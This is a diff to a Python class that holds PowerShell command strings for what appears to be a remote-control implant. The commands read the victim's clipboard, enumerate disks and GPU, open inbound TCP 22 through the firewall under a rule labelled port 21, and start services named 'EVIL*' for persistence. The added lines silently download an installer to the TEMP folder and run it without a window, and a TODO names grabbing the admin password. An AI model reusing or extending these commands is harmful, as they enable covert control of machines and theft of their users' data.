@@ -24,7 +24,7 @@ class Powershell():
         CLIPBOARD        = f"{psPrefix}Get-clipboard"
         DISKS            = f"{psPrefix}Get-Disk | Format-List FriendlyName, SerialNumber, PartitionStyle, @{{Name='Size, Gb'; Expression={{[int]($_.Size/1GB)}}}}"
         GPU              = f"{psPrefix}Get-WmiObject win32_VideoController | Format-List VideoProcessor, VideoModeDescription, Status, DriverVersion, DriverDate, PNPDeviceID"
-          
+
     class OpenPorts(Enum):
         # Open Port and services
         OPENSSHPORT         = f"{psPrefix}New-NetFirewallRule -DisplayName 'ALLOW TCP PORT 21' -Direction inbound -Profile Any -Action Allow -LocalPort 22 -Protocol TCP"
@@ -39,6 +39,11 @@ class Powershell():
     class Persist(Enum):
         STARTEVILSERVICE    = f"{psPrefix}Get-Service -name 'EVIL*' | Start-Service"
         CHECKEVILSTATUS     = f"{psPrefix}(Get-Service -Name 'EVIL*').status"
+    
+    class Installing(Enum):
+        PYTHON32             = f'{psPrefix}[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.5/python-3.9.5-webinstall.exe" -OutFile "$($Env:TEMP)/python-3.9.5-webinstall.exe" ; Start-Process -NoNewWindow -Filepath "$($Env:TEMP)/python-3.9.5-webinstall.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0"'
+        PYTHON64             = f'{psPrefix}[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.5/python-3.9.5-amd64-webinstall.exe" -OutFile "$($Env:TEMP)/python-3.9.5-amd64-webinstall.exe" ; Start-Process -NoNewWindow -Filepath "$($Env:TEMP)/python-3.9.5-amd64-webinstall.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0"'
+
 
     # TODO: OPTIONNEL
     # GETADMINPASS = ""
